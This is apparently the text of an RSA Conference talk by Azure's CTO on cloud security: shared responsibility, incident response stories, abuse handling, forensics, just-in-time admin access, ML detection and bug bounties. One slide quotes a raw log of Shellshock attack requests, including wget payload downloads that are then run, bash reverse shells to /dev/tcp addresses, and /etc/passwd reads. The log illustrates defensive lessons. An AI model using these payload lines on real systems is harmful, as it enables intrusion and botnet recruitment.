SESSION ID: EXP-W01
Assume Breach: An Inside Look at Cloud Service Provider Security

Mark Russinovich

CTO, Microsoft Azure Microsoft
@markrussinovich

1

#RSAC

#RSAC
Microsoft Cloud Security Overview

Protect

Security Development Lifecycle & Operational Security Assurance Network and Identity Isolation Least Privilege / Just-in-Time (JIT) Access Vulnerability / Update Management

Detect

Auditing and Certification Live Site Penetration Testing Centralized Logging and Monitoring Fraud and Abuse Detection

Respond

Breach Containment Coordinated Security Response Customer Notification

#RSAC
Clouds Are Appealing to Adversaries
 Easily available free trials  Anonymity  Tons of compute power  IP blocks rich with Internet-exposed services  Concentration of vulnerable assets  High bi-directional bandwidth

#RSAC
Cloud Security is a Shared Responsibility
 Azure:
 Performs BigData analysis for intrusion detection of Azure infrastructure  Manages monitoring and alerting of security events of the platform  Employs denial of service attack mitigations and detections  Responds to fraud / abuse and sends Azure security notifications
 Customer:
 Configures security of their subscription and applications  Security monitoring on their Virtual Machines, Roles, Website, etc.  Can add extra layers of deploying Azure provided security controls  Responds to alerts from tenant security monitoring and Azure Security
notifications

#RSAC
Let me share a few internal stories...

#RSAC
A Day in the Life of an Incident Responder...

#RSAC
Azure Security Incident Response
 Goal is to protect, defend and respond to our customer needs  Let's look at some illustrative examples
 Unlike my books, these are not hypothetical or foreshadowing  These are real incidents that have occurred this year (names redacted
and changed of course)

#RSAC
Compromised VMs: An Example
The Internet
Note: although we do not monitor customer VMs and applications without their permission, we do automatically monitor the overall traffic, unusual spikes in activity and suspicious connections

#RSAC
Customer Response
 We notified customer of potential compromise
 They were happy we alerted them  They immediately analyzed their logs, both on the VM and in Azure
Storage:
 They noticed that the A/V in their VMs had been turned off

#RSAC
Azure Logging
 And event logs showed some...unusual...activity a few days prior:

#RSAC
Azure Logging
 The customer had not been regularly looking at the logs
 Or pulling them into the on-premise SIEM they normally use...  Alerts and activity were clear and breach activity would have been
immediately detected!
 Lesson: if an attacker breaches the cloud but no one looks at the data, did they really breach?
 Should customer be billed for consumption of resources resulting in breach?
 Known vulnerability and missing patch vs. near 0-day?

#RSAC
ShellShock Impact

ActivityTime Request 9/25/2014 6:54 ()+{+:;};+/bin/bash+-c+"wget+http://fake.itv247.net/bash/index.php" 9/25/2014 9:26 ()+{+:;};+/bin/bash+-c+"wget+http://19vision.com/19.php+-O+/tmp/tmp1238129282"
9/25/2014 10:24 ()+{+:;};+/bin/bash+-c+"curl+http://laravel.pw/a.php" 9/25/2014 12:09 ()+{+:;};+/bin/sh+-i+>;AMP;+/dev/tcp/101.5.211.158/8080+0>;AMP;1 9/25/2014 12:34 ()+{+:;};+/bin/cat+/etc/passwd 9/25/2014 13:03 ()+{+:;};+/bin/bash+-c+"wget+http://psicologoweb.net/mc/s.php" 9/25/2014 14:13 ()+{+:;};+/bin/bash+-c+"telnet+namesense.com+7700" 9/25/2014 15:31 ()+{+:;};+/bin/bash+-c+"wget+http://91.207.254.60/.../bash.php?pass=/cgi-sys/defaultwebpage.cgi" 9/25/2014 18:48 ()+{+:;};+/bin/cat+/tmp/1 9/25/2014 19:05 ()+{+:;};+/bin/bash+-c+"ls" 9/25/2014 23:16 ()+{+:;};+/bin/bash+-i+>;AMP;+/dev/tcp/188.165.234.95/445+0>;AMP;1
9/26/2014 3:45 ()+{+:;};+/bin/bash+-c+"wget+-O+/var/tmp/wow1+208.118.61.44/wow1;perl+/var/tmp/wow1;rm+-rf+/var/tmp/wow1" 9/26/2014 4:25 User-Agent:+()+{+:;};+/bin/bash+-c+"wget+http://psicologoweb.net/mc/s.php/11st.co.kr" 9/26/2014 5:44 ()+{+:;};+/bin/bash+-c+'/bin/bash+-i+>;AMP;+/dev/tcp/195.225.34.101/3333+0>;AMP;1' 9/26/2014 7:04 User-Agent:+()+{+:;};+sudo+yum+update+bash 9/26/2014 7:05 ()+{+:;};+/bin/bash+-c+"wget+--delete-after+http://stelradradiators.ru/_files/File/test.php" 9/26/2014 10:16 ()+{+:;};+/bin/bash+-c+"wget+--delete-after+http://remika.ru/userfiles/file/test.php" 10/2/2014 1:24 ()+{+:;};+/bin/bash+-c+"wget+ellrich.com/legend.txt+-O+/tmp/.apache;killall+-9+perl;perl+/tmp/.apache;rm+-rf+/tmp/.apache"

 Botnet Building 101
 9/24: ShellShock Disclosed
 Attacks begin almost immediately
 IaaS (Linux) VMs Attacked become

zombies

#RSAC
Tenant-level Breach Notification
 Notification to tenant admins
 Require tenant response / remediation
 48 hour notice > Immediate Deployment Suspension > Disable Subscription

#RSAC
Top Exposures Resulting in Tenant Breach

Risk
Internet Exposed RDP or SSH Endpoints
Virtual Machine Missing Security Patches
Web Application Vulnerability
Weak Admin/Co-Admin Credentials Unrestricted SQL Endpoint Storage Key Disclosure Insufficient Security Monitoring

Mitigation
Network ACLs or Host-based Firewall; Strong passwords; VPN or SSH Tunnels
Keep Automatic Updates Enabled;
Securing Azure Web Applications; Vulnerability scan/penetration test
Azure Multi-Factor Authentication; Subscription Management Certificate Azure SQL Firewall Manage Access to Storage Resources Azure Security and Log Management;

#RSAC
Infrastructure Protection

Security Incident Response Lifecycle

DevOps Engaged

Event Detected
Event Start

Incident Assessment

Security Team Engaged

Security Event Confirmed

Customer Notification

Leverages a 9-step incident response process

Determine Affected
Customers

Focuses on containment and recovery

Makes contractual commitments regarding customer notification

Determine Customer Impact

#RSAC
Customer Process Step 1
Azure Customer Notification

#RSAC
FTP Bug Timeline
 Background of Incident:
 Data uploaded to Azure Websites through FTP was accessible to other customers
 Potential data disclosure impacting < 20 customers

#RSAC
Heartbleed, Shellshock and MS14-066 (oh my!)

 Heartbleed
 OpenSSL Privilege Escalation  Broad media attention  Azure Infrastructure: < 24 hours to declare all clear  Scanned public Azure and notified vulnerable customers
 ShellShock
 Bash Privilege Escalation  Less publicity than Heartbleed yet higher risk  Azure Infrastructure: 2 hours to declare "all clear"  Scanned public Azure and notified vulnerable customers
 MS14-066
 Windows Schannel Privilege Escalation  Began roll out of updated of updated images within 6mins of
patch release  Notified impacted customers via Azure Security Advisory

Azure
Azure Active Directory
Quick Create Gallery

Service/Feature/Device
Cloud Services (Web and Worker Role)

Investigation Uses Complete OpenSSL Vulnerable



No

No

Virtual Machines (IaaS) Windows



No

No

Virtual Machines (IaaS) Linux



Yes

Yes

Windows Azure Traffic Manager (WATM)



Virtual Networking



No

No

No

No

Storage (Tables, Blobs, Queues)



No

No

Web sites



Yes

No

Mobile Services



Yes

No

Service Bus



No

No

Tasks



No

No

Workflow



No

No

CDN



Yes

No

StorSimple



Yes

No

Microsoft Online Directory Service



No

No

Organizational Identity



No

No

Access Control Service



No

No

Rights Management Service



No

No

Identity Access Management



No

No

Multi-factor Authentication



Yes

No

Ubuntu (all versions)



Yes

No

OpenSuse CentOS Puppet Server Chef Oracle SQL VM Windows (all flavors)



Yes

No



Yes

No



Yes

No



Yes

No



Yes

No



No

No

Heartbleed Status Tracking

#RSAC
Cloud vs. Cloud

Cloud Provider A

Cloud Provider B

 35M packets per second of attack traffic
 Azure OneDDoS drops < 90% of DoS traffic at Edge
 The cause....cloud vs. cloud

Cloud Provider C

#RSAC
Managing Abuse

#RSAC
Growth of Abuse Cases Over Time

AZURE ABUSE CASES 2H2014

Cases

800

702

700

618

600

578

500

480

400

306

300

242

200

100

0 Jul

Aug

Sep

Oct

Nov

Dec

Types of Abuse · SPAM · Phishing · DoS · Hacking · Copyright Infringement · Illegal Activities ·...
Report Abuse at: https://cert.microsoft.com

#RSAC
Abuse Incident
 Customer received this notification from Azure incident response team:

#RSAC
Understanding Abuse Attacks
 The customer (Linux) VMs had been compromised  They actually did monitor all their logs
 But they did not received any alerts  Azure detected attacker due compromise VMs used to attack others ­
e.g. DoS
 What happened?
 They asked Microsoft Support for help...  Deeper analysis of many VMs was necessary

#RSAC
Forensic Analysis
 In Azure, we can perform detailed large-scale forensics analysis of VMs
 We do this for trial VMs that have been shutdown for fraud, abuse and other bad behavior to collect/detect such indicators
 We don't execute this on customer assets without their consent  Would be intrusion and violation of our data privacy agreement

#RSAC
Forensic Analysis
 But when you need assistance in a large-scale breach, and with your permission...
 We can perform detailed analysis
 What did we find?
 There was a zero-day attack on a Linux-based application  That was not known in the industry yet...and never seen in the wild
 Yes, we analyze Linux and not just Windows!

#RSAC
Cloud Scale Forensics
 Scale from 100's-1000's of cores as needed  Deployed around the world  ~45K VMs Analyzed Weekly  15+ PBs of collected artifacts  >100K VMs analyzed during single investigation

#RSAC
Access Management

#RSAC
Restricted Access Workflow in Azure

TFS Authentication
Attribution Authorization
Access Audit

· Incident/Support Request Filed · Credentials collected and 2FA submitted · Collecting group membership and claims · Evaluating claims against policies · Access decision enforced · All actions are logged to Azure storage

#RSAC
JiT/JEA/RBAC
 No standing access  Our JiT system grants least privilege required to complete tasks  Everything structured using RBAC and Azure Active Directory

#RSAC
2FA Required to Even Request Access
 All steps logged independently  Security analytics system monitors access JiT/RBAC requests
 Alerts when workflows do not correlate with TFS/requests  When an admin subverts the process, a Sev 1 incident occurs

Online Services Secure Console

 From this:

Browsers/Plugins

IE

Flash

Firefox

Chrome

...

...

Third Party/Open Source Tools

PDF Reader

Notepad++ PowerGui

....

...

...

MS Tools

Visual Studio

Excel

Word

Outlook

PPT

...

Base OS
To this

#RSAC

Securing the Console

Least Privilege
Execution restriction

Active Scanning

Patching

Base OS

Network Hardening

Limited Functionality

#RSAC

Enforced Admin Console

#RSAC
Use of Secure Console for administrative operations in the cloud
(in addition to 2FA for access or privilege elevation)

#RSAC
Data Science

Machine Learning
Traditional Programming
Data Program

Computer System

Machine Learning
Data Output

Computer System

Output

#RSAC

Program
Source: Lectures by Pedro Domingos

#RSAC
Why Machine Learning is Relevant to Defense

Fraud Detection

#RSAC
 Fraud: Theft of service; Use of service without intent to pay
 Example: Stolen payment instrument
 Fraud Storms
 Potential for Capacity Impact  Often lead to spike in Abuse
 ML-based detection
 Sign-up patterns  Compute Usage  Bandwidth Usage  etc.

#RSAC
Detecting Anomalies

#RSAC
Example: Phishing Attacks
 Azure Active Directory and Office 365, automatically detect when a user may have been compromised
 Company admins can configure alerts

#RSAC
Automatic Detection
 Even though a user's password had been stolen...
 When the attacker tried to logon to Azure from (name your favorite country here...)
 Customers were alerted automatically!

#RSAC
RED vs. BLUE

Red Teaming
Model real-world attacks
 Model emerging threats & use blended threats
 Pivot laterally & penetrate deeper
 Exfiltrate & leverage compromised data
 Escape & Evade / Persistence

Identify gaps in security story
 Measures Time to Compromise (MTTC) / Pwnage (MTTP)
 Highlight security monitoring & recovery gaps
 Improves incident response tools & process

#RSAC
Demonstrable impact
 Prove need for Assume Breach
 Enumerate business risks  Justify resources,
priorities, & investment needs

Blue Teaming
Exercises ability to detect & respond

Enhances situational awareness

Measures readiness & impact

 Detect attack & penetration (MTTD)
 Respond & recover to attack & penetration (MTTR)
 Practiced incident response

 Produces actionable intelligence
 Full visibility into actual conditions within environment
 Data analysis & forensics for attack & breach indicators

 Accurately assesses realworld attacks
 Identifies gaps & investment needs
 Focus on slowing down attackers & speeding recovery
 Hardening that prevents future attacks

#RSAC

Catching Red Team
1

#RSAC
1. Non-standard user access alert triggered ­ access didn't go through standard JIT or access approvals
2. Log of new user detection: nonstandard user name
2

Intrusion detection in the Cloud

New external IP
IP: 65.52.120.233 Domain: popsectest.cloudapp.net Process: powershell.exe User: _spogmsvc3

Large outbound data transfer
IP: 65.52.120.233:1337 Domain: popsectest.cloudapp.net Process: powershell.exe User: _spogmsvc3 Bytes: 11,000K

This attacker is trying to avoid detection by using PowerShell. Think he'll succeed? Our network monitoring detects his exfiltration and command-and-control activity. Our machine learning flags his session as unusual relative to previous behavior.

Beacon
IP: 65.52.120.233:1338 Domain: popsectest.cloudapp.net Process: svchost.exe User: SYSTEM Interval: 4
MCM: Abnormal activity pattern
Host: CH1YL1ADM004 User: _spogmsvc3 LogonID: 1043 Worst transition score: 100 Overall score: 59

#RSAC

#RSAC
Data-Driven Offense
 Reduce likelihood of detection  Decrease MTTC and MTTP  Use of ML for offense  Leverages the cloud  Examples:
 Data-driven pivoting  Visualization

#RSAC
Next Generation APTTM

Intelligence Driven Machine Learning

Varied Persistence Diversionary Tactics Multi-Front Assaults

#RSAC
Announcing: Azure Security Bug Bounties

#RSAC
Find bugs in Azure, Get Paid!
 Existing bug bounty programs cover:
 Online Services Bug Bounty: $500-$15,000 USD  Mitigation Bypass: up to $100,000 USD
 We have paid in the past, we will do it again!  BlueHat Bonus for Defense: up to $50,000 USD
 New:
 Microsoft Online Services Bug Bounty: ++Azure  Mitigation Bypass Bounty Program: ++Hyper-V  ++Project Spartan Bug Bounty Program
https://aka.ms/bugbounty

